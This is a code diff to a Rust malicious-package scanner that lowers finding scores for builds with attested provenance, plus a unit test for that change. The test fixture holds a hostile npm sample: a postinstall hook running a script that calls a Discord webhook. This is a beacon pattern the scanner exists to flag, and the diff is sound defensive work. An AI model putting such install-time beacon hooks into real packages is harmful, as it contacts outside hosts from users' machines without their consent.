@@ -66,6 +66,26 @@ pub fn extract_archive(ecosystem: &Ecosystem, bytes: &[u8]) -> Result<Vec<(Strin
     Ok(files)
 }
 
+/// How much an attested build (npm provenance/SLSA) lowers a finding score.
+pub const PROVENANCE_RELIEF: u8 = 3;
+
+/// Attested builds keep their finding but score lower: machinery in the
+/// release pipeline is harder for a compromised publisher to imitate.
+pub fn apply_provenance(finding: &mut ContentFinding, attested: bool) {
+    if !attested {
+        return;
+    }
+    finding.score = finding.score.saturating_sub(PROVENANCE_RELIEF);
+    if !finding
+        .rules
+        .iter()
+        .any(|rule| rule == "provenance-attested")
+    {
+        finding.rules.push("provenance-attested".to_string());
+    }
+    finding.summary = format!("{} (build provenance attested)", finding.summary);
+}
+
 /// Extract, scan, and persist the finding for a package archive.
 pub fn scan_archive_bytes(
     store: &dyn MetadataStore,
@@ -74,12 +94,28 @@ pub fn scan_archive_bytes(
     version: &Version,
     bytes: &[u8],
 ) -> Result<Option<ContentFinding>> {
+    scan_archive_bytes_with_provenance(store, ecosystem, name, version, bytes, false)
+}
+
+/// Same as `scan_archive_bytes`, downgrading the score when the registry
+/// reports a verified build attestation.
+pub fn scan_archive_bytes_with_provenance(
+    store: &dyn MetadataStore,
+    ecosystem: &Ecosystem,
+    name: &str,
+    version: &Version,
+    bytes: &[u8],
+    attested: bool,
+) -> Result<Option<ContentFinding>> {
     let files = extract_archive(ecosystem, bytes)?;
     let borrowed: Vec<(&str, &str)> = files
         .iter()
         .map(|(path, content)| (path.as_str(), content.as_str()))
         .collect();
-    let finding = scan_package_files(ecosystem, name, version, &borrowed);
+    let mut finding = scan_package_files(ecosystem, name, version, &borrowed);
+    if let Some(finding) = finding.as_mut() {
+        apply_provenance(finding, attested);
+    }
     if let Some(finding) = &finding {
         store.save_content_finding(finding)?;
     }
@@ -619,6 +655,34 @@ mod tests {
             .content_finding(&Ecosystem::Npm, "lib", &version())
             .unwrap()
             .is_none());
+    }
+
+    #[test]
+    fn provenance_attestation_downgrades_the_finding() {
+        let files = [
+            (
+                "package.json",
+                r#"{"name":"evil","scripts":{"postinstall":"node beacon.js"}}"#,
+            ),
+            (
+                "beacon.js",
+                "const https = require('node:https'); https.get('https://discord.com/api/webhooks/1/x');\n",
+            ),
+        ];
+        let mut finding = scan_package_files(&Ecosystem::Npm, "evil", &version(), &files).unwrap();
+        assert_eq!(finding.score, 9);
+        apply_provenance(&mut finding, true);
+        assert_eq!(finding.score, 6);
+        assert!(finding
+            .rules
+            .iter()
+            .any(|rule| rule == "provenance-attested"));
+        assert!(finding.summary.contains("provenance"));
+
+        let mut unattested =
+            scan_package_files(&Ecosystem::Npm, "evil", &version(), &files).unwrap();
+        apply_provenance(&mut unattested, false);
+        assert_eq!(unattested.score, 9);
     }
 
     #[test]
